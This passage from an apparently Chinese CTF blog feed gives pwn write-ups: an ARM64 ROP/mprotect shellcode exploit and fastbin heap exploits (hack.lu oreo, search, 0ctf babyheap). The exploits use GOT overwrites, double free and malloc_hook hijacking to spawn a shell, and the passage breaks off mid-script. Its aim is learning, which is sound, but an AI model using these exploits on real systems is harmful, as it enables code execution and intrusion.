p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br></pre></td></tr></table></figure><p>先布置完cc处的栈，然后跳回ac里执行mprotect，会再执行一遍cc，我们覆盖x30的内容为我们想它跳到的地址即可</p><p>完整的exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./pwn&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;106.75.126.171&quot;, 33865)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = 0x00411068</span><br><span class="line">call_mprotect = 0x0400600</span><br><span class="line">shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">pay = p64(0x04007e0) #call_mprotect</span><br><span class="line">pay += p64(0)</span><br><span class="line">pay += shellcode   #must in addr+0x10</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect  </span><br><span class="line">payload += p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29?</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br>        <a href="https://gdufs-king.github.io/2019/11/06/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/" target="_blank" rel="noopener">V1ct0r师傅</a><br>        <a href="https://zszcr.github.io/2018/11/05/2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0/#more" target="_blank" rel="noopener">zs0zrc师傅</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看&lt;/p&gt;
&lt;h2 id=&quot;arm环境搭建&quot;&gt;&lt;a href=&quot;#arm环境搭建&quot; class=&quot;headerlink&quot; title=&quot;arm环境搭建&quot;&gt;&lt;/a&gt;arm环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#安装qemu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-get install qemu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#更新一下&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装32位的依赖库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install -y gcc-arm-linux-gnueabi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#运行32位的动态链接程序方法&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qemu-arm -L /usr/arm-linux-gnueabi ./文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装64位的依赖库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#运行64位的动态链接程序方法&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#安装gdb调试工具&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install git gdb gdb-multiarch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>fastbinin_attack</title>
    <link href="https://c0yo7e.github.io/2020/02/07/fastbinin-attack/"/>
    <id>https://c0yo7e.github.io/2020/02/07/fastbinin-attack/</id>
    <published>2020-02-07T13:59:05.000Z</published>
    <updated>2020-08-02T05:11:05.090Z</updated>
    
    <content type="html"><![CDATA[<p>就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒<br>好了，废话不多说，开始吧</p><a id="more"></a><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>add<br><img src="/2020/02/07/fastbinin-attack/1.png" alt><br>里面的rifle name是从a288+25开始写，然后description是直接从a288处开始的，总共长度是56字节，地址占了四个字节，56-4 =52   description占25，name则占27<br>具体看汇编<br><img src="/2020/02/07/fastbinin-attack/2.png" alt><br>v1是pre指针     为eax+52，即最后四个字节为指针地址，而这个指针指向的是description。<br>我们可以写入的name有为56，存在溢出，可以覆写pre的地址</p><p>show<br><img src="/2020/02/07/fastbinin-attack/3.png" alt><br>这里show的内容description是指针指向的地址<br>我们可以借此leak出libc</p><p>massage<br><img src="/2020/02/07/fastbinin-attack/4.png" alt><br>进行更改的地方是a2a8里存着的地址指向的地方，利用此来get shell</p><p>order<br><img src="/2020/02/07/fastbinin-attack/5.png" alt><br>这里就是free，free完之后a2a0+1</p><p>1、使pre覆写成puts_got的地址，show的时候，description里面的内容为puts_addr<br>2、构造一个fack chunk，我们知道呢，一个chunk的结构大概是，pre_size, size,内容。我们知道a2a4的地方是写add一次就+1，a2a0是free一次+1，a2a8是存放massage指向内容的地址，可以利用这个构建一个chunk，又因为要绕过题目检查，又存name的地方也有存description的地方，所以要构造下一个chunk，把size 0x41写进去<br>3、改一个got表为system即可，这里改的是scanf，wiki里面改的是strlen（对这个函数我不是很熟，不太懂system最后的传参，就没用了），据说还可以改free_hook 为onegadget（我不会找free_hook的地址，全网搜貌似也没搜出来用这种方法的exp）</p><p>关于wiki上的exp，看了大佬的博客之后才知道以下的姿势（关于strlen的传参）<br>这样就相当于往0x0804a250指向的地址写入system。<br>这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);<br>分号代表system函数将这个参数分成两部分，先后执行里面的命令。<br>因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，<br>就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);<br>这样就能实现最终目的了。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">import sys</span><br><span class="line"># context.binary = &quot;./melong&quot;</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./oreo&apos;)</span><br><span class="line">elf = ELF(&apos;./oreo&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(name,description):</span><br><span class="line"># p.recvuntil(&quot;6. Exit!&quot;)</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line"># p.recvuntil(&quot;Rifle name: &quot;)</span><br><span class="line">p.sendline(name)</span><br><span class="line"># p.recvuntil(&quot;Rifle description: &quot;)</span><br><span class="line">p.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line"></span><br><span class="line">def order():</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def massage(notice):</span><br><span class="line"># p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">p.sendline(notice)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">name = 27 * &apos;a&apos; + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">add(name ,25 * &apos;a&apos;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line">p.recvuntil(&apos;Description: &apos;)</span><br><span class="line">puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line"># libc_base = libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">onegadget = libc_base + 0x5fbc6 #尝试过把scanf改成onegadget，但是五个都没成功。。。</span><br><span class="line">i=1</span><br><span class="line">for i in range(0x3f): </span><br><span class="line">add(&apos;a&apos; * 27 + p32(0),25 * &apos;a&apos;)  #num -&gt; 0x41</span><br><span class="line"></span><br><span class="line">#num addr = 0x804A2A4</span><br><span class="line"></span><br><span class="line">#fack chunk</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;*27+p32(0x804A2A8),&apos;a&apos;*25)</span><br><span class="line">massage(&apos;\x00&apos;*0x24+p32(0x41)) #description&apos;s chunk</span><br><span class="line"></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line">scanf_got = elf.got[&apos;__isoc99_sscanf&apos;]</span><br><span class="line">add(&apos;a&apos;,p32(scanf_got))</span><br><span class="line"></span><br><span class="line">massage(p32(system_addr))</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-search"><a href="#2015-search" class="headerlink" title="2015 search"></a>2015 search</h2><p>这题就没有很认真的写wp，就把不太明白的点记一下吧</p><p>一开始一直没想到free完一次之后可以查找’\x00’这个word，就一直很迷惑要怎么double free<br>分析两个一开始没懂的点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">index_sentence(&apos;a&apos; * 0x5d + &apos; d &apos;)  #a</span><br><span class="line">index_sentence(&apos;b&apos; * 0x5d + &apos; d &apos;)  #b</span><br><span class="line">index_sentence(&apos;c&apos; * 0x5d + &apos; d &apos;)  #c</span><br><span class="line"> </span><br><span class="line"> # a-&gt;b-&gt;c-&gt;NULL</span><br><span class="line"> search_word(&apos;d&apos;)   #正常的删除 </span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> </span><br><span class="line"> # b-&gt;a-&gt;b-&gt;a-&gt;...      </span><br><span class="line"> search_word(&apos;\x00&apos;)    #首先判断c是否满足条件，由于c是fastbin中的最后一个节点，其fd的值为0，因此不能满足i-&gt;sentence != NULL的条件，因此第一个输出时候删除的是对应的b</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除b</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除a</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除  libc_leak的时候添加的sentence</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br></pre></td></tr></table></figure><p> 最后是只删除了b使得  a-&gt;b-&gt;c-&gt;null 又多了一个头变成了 b-&gt; a-&gt;b-&gt;c-&gt;null 即形成了b-&gt;a-&gt;b-&gt;a-&gt;…的循环，形成了double free</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> #此时的fastbin为 b-&gt;a-&gt;b</span><br><span class="line"># 3. fastbin attack to malloc_hook nearby chunk    向malloc_hook中写东西，改写b-&gt;fd，使其指向malloc_hook附近</span><br><span class="line">fake_chunk_addr = main_arena_addr - 0x33</span><br><span class="line">fake_chunk = p64(fake_chunk_addr).ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(fake_chunk)  #b的fd改成fake_addrs</span><br><span class="line"> index_sentence(&apos;a&apos; * 0x60)   #分配chunk_a</span><br><span class="line"> index_sentence(&apos;b&apos; * 0x60)  #分配chunk_b 填了chunk_b之后才能往fake_chunk里面写payload</span><br><span class="line"> </span><br><span class="line"> one_gadget_addr = libc_base + 0xf02a4</span><br><span class="line"> payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr)  </span><br><span class="line"> payload = payload.ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(payload)    #赋写malloc_hook为one_gadget</span><br></pre></td></tr></table></figure><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p> 先介绍一下Arbitrary Alloc<br>（来自ctf wiki）</p><p>只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><p>example<br>在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1=malloc(0x60);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1=0x7ffff7dd1af5-0x8;</span><br><span class="line">    malloc(0x60);</span><br><span class="line">    chunk_a=malloc(0x60);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0</span><br></pre></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f</span><br></pre></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##define fastbin_index(sz)                                                      \</span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）<br>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 <strong>malloc_hook 的内容 (在我的 libc 中</strong>realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line"> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line"> $rax   : 0x7ffff7dd1afd</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。<br>一般都是在5或者d处（作为最后8和0结尾的地方），所以一般alloc的里面，覆盖malloc_hook的话，要 -0x33（3结尾来对齐)</p><p>okk,开始进入正题<br>在fill里面，发现可以自己重新写size再填内容，和开始alloc的大小可以不一样，然后free没有清零，以此制造overlap</p><p>第一步先 用overlap leak基址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80) #覆写最后一字节，将free掉的2指向4的地址</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21) #把4的size改成0x21,下一次alloc的时候可以写入这个地方</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91) #指向4之后再将大小改回来</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80) #5 如果没有这个，free就没了，打不出来地址</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print 